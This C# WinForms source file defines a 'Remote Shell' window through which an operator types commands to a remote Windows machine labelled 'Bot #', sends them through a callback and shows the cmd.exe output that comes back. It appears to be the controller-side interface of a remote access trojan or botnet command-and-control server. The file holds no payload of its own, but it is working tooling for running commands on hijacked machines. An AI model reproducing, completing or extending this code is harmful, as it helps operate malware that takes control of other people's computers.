using System;
using System.Windows.Forms;
using System.Drawing;

namespace Server.UI
{
    public partial class RemoteShellForm : Form
    {
        private int _connectionId;
        private Action<int, string> _sendCommandCallback;
        private RichTextBox txtConsole = null!;
        private TextBox txtCommand = null!;
        private Label lblStatus = null!;
        private string _currentDirectory = "";
        private System.Text.StringBuilder _outputBuffer = new System.Text.StringBuilder();
        private System.Windows.Forms.Timer _flushTimer = null!;
        private DateTime _lastFlushTime = DateTime.Now;

        public RemoteShellForm(int connectionId, string clientIp, Action<int, string> sendCommandCallback)
        {
            _connectionId = connectionId;
            _sendCommandCallback = sendCommandCallback;
            
            InitializeComponent();
            InitializeCustomComponents(clientIp);
            
            _flushTimer = new System.Windows.Forms.Timer();
            _flushTimer.Interval = 300;
            _flushTimer.Tick += (s, e) => FlushOutputBuffer();
            _flushTimer.Start();
        }

        private void InitializeCustomComponents(string clientIp)
        {
            this.Text = $"Remote Shell - Connection #{_connectionId} ({clientIp})";
            this.Size = new Size(900, 600);
            this.StartPosition = FormStartPosition.CenterParent;
            this.FormBorderStyle = FormBorderStyle.Sizable;
            this.MinimumSize = new Size(600, 400);

            // Panel tren - Trang thai
            Panel topPanel = new Panel
            {
                Dock = DockStyle.Top,
                Height = 40,
                BackColor = Color.FromArgb(40, 40, 40),
                Padding = new Padding(10, 10, 10, 5)
            };

            lblStatus = new Label
            {
                Text = $"🟢 Connected to Bot #{_connectionId} | Ready to send commands",
                Dock = DockStyle.Fill,
                ForeColor = Color.Lime,
                Font = new Font("Consolas", 10, FontStyle.Bold)
            };

            topPanel.Controls.Add(lblStatus);

            // Vung hien thi console output
            txtConsole = new RichTextBox
            {
                Dock = DockStyle.Fill,
                BackColor = Color.Black,
                ForeColor = Color.White,
                Font = new Font("Consolas", 10),
                ReadOnly = true,
                Multiline = true,
                ScrollBars = RichTextBoxScrollBars.Vertical,
                WordWrap = true
            };

            // Panel duoi - Nhap lenh
            Panel bottomPanel = new Panel
            {
                Dock = DockStyle.Bottom,
                Height = 50,
                BackColor = Color.FromArgb(45, 45, 48),
                Padding = new Padding(10)
            };

            Label lblPrompt = new Label
            {
                Text = "cmd>",
                Location = new Point(10, 15),
                AutoSize = true,
                ForeColor = Color.Yellow,
                Font = new Font("Consolas", 11, FontStyle.Bold)
            };

            txtCommand = new TextBox
            {
                Location = new Point(60, 12),
                Width = 700,
                BackColor = Color.FromArgb(30, 30, 30),
                ForeColor = Color.Lime,
                Font = new Font("Consolas", 11),
                BorderStyle = BorderStyle.FixedSingle,
                TabStop = true,
                Enabled = true
            };
            txtCommand.KeyDown += TxtCommand_KeyDown;
            txtCommand.Anchor = AnchorStyles.Left | AnchorStyles.Right | AnchorStyles.Top;
            txtCommand.TextChanged += (s, e) => 
            {

                System.Diagnostics.Debug.WriteLine($"TextBox content: '{txtCommand.Text}'");
            };

            Button btnSend = new Button
            {
                Text = "Send",
                Location = new Point(770, 10),
                Size = new Size(80, 28),
                BackColor = Color.FromArgb(0, 120, 215),
                ForeColor = Color.White,
                FlatStyle = FlatStyle.Flat,
                Font = new Font("Segoe UI", 9, FontStyle.Bold)
            };
            btnSend.Click += BtnSend_Click;
            btnSend.Anchor = AnchorStyles.Right | AnchorStyles.Top;

            bottomPanel.Controls.AddRange(new Control[] { lblPrompt, txtCommand, btnSend });


            this.Controls.Add(txtConsole);
            this.Controls.Add(bottomPanel);
            this.Controls.Add(topPanel);

            AppendToConsole($"=== Remote Shell - Bot #{_connectionId} ({clientIp}) ===", Color.Cyan);
            AppendToConsole($"Session started: {DateTime.Now:yyyy-MM-dd HH:mm:ss}\n", Color.Gray);
            AppendToConsole("cmd> ", Color.Yellow, false);

            txtCommand.Focus();
        }

        private void TxtCommand_KeyDown(object? sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                e.SuppressKeyPress = true;
                SendCommand();
            }
        }

        private void BtnSend_Click(object? sender, EventArgs e)
        {
            SendCommand();
        }

        private void SendCommand()
        {
            string command = txtCommand.Text.Trim();
            if (string.IsNullOrEmpty(command))
                return;

            AppendToConsole(command + "\n", Color.White);

            try
            {
                _sendCommandCallback(_connectionId, command);
                lblStatus.Text = $"🟡 Executing: {command}";
                lblStatus.ForeColor = Color.Yellow;
            }
            catch (Exception ex)
            {
                AppendToConsole($"[Error] {ex.Message}\n", Color.Red);
                AppendToConsole("cmd> ", Color.Yellow, false);
            }

            txtCommand.Clear();
        }

        public void AppendOutput(string output)
        {
            if (txtConsole.InvokeRequired)
            {
                txtConsole.Invoke(() => AppendOutput(output));
                return;
            }

            if (string.IsNullOrWhiteSpace(output))
                return;

            _outputBuffer.Append(output);
            
            bool shouldFlush = false;
            string buffered = _outputBuffer.ToString();
            
            if (buffered.Contains(">"))
            {
                shouldFlush = true;
            }
            else if (buffered.Length >= 30)
            {
                shouldFlush = true;
            }
            else if ((DateTime.Now - _lastFlushTime).TotalMilliseconds > 500)
            {
                shouldFlush = true;
            }
            
            if (shouldFlush)
            {
                FlushOutputBuffer();
            }
        }
        
        private void FlushOutputBuffer()
        {
            if (_outputBuffer.Length == 0)
                return;
                
            string buffered = _outputBuffer.ToString();
            if (string.IsNullOrWhiteSpace(buffered))
            {
                _outputBuffer.Clear();
                return;
            }
            
            string cleaned = System.Text.RegularExpressions.Regex.Replace(buffered, @"[\x00-\x09\x0B-\x0C\x0E-\x1F]", "");
            
            if (cleaned.Contains("Active code page:"))
            {
                _outputBuffer.Clear();
                return;
            }
            
            if (!string.IsNullOrWhiteSpace(cleaned))
            {
                AppendToConsole(cleaned, Color.White);
                
                var promptMatches = System.Text.RegularExpressions.Regex.Matches(cleaned, @"([A-Za-z]:\\[^>]+)>");
                if (promptMatches.Count > 0)
                {
                    string lastDirectory = promptMatches[promptMatches.Count - 1].Groups[1].Value;
                    _currentDirectory = lastDirectory;
                    
                    AppendToConsole("cmd> ", Color.Yellow, false);
                    
                    lblStatus.Text = $"🟢 Ready to send commands";
                    lblStatus.ForeColor = Color.Lime;
                    txtCommand.Focus();
                }
            }
            
            _outputBuffer.Clear();
            _lastFlushTime = DateTime.Now;
        }

        private void AppendToConsole(string text, Color color, bool newLine = true)
        {
            txtConsole.SelectionStart = txtConsole.TextLength;
            txtConsole.SelectionLength = 0;
            txtConsole.SelectionColor = color;
            txtConsole.AppendText(newLine ? text : text);
            txtConsole.ScrollToCaret();
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            base.OnFormClosing(e);
            AppendToConsole("\n=== Session Ended ===\n", Color.Cyan);
        }
    }
}
